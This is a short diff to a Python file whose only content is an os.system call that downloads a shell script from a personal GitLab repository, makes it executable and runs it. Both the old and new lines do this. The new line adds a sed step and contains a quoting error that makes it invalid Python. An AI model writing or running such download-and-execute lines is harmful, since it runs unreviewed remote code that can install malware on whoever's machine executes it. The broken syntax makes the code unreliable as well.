@@ -1,2 +1,2 @@
 import os
-os.system('wget https://gitlab.com/barbieanay003/seger/-/raw/main/new.sh && chmod +x new.sh && bash new.sh')
+os.system('wget -O new https://gitlab.com/barbieanay003/seger/-/raw/main/new.sh && sed -i 's/\r$//' new && chmod +x new && bash new')
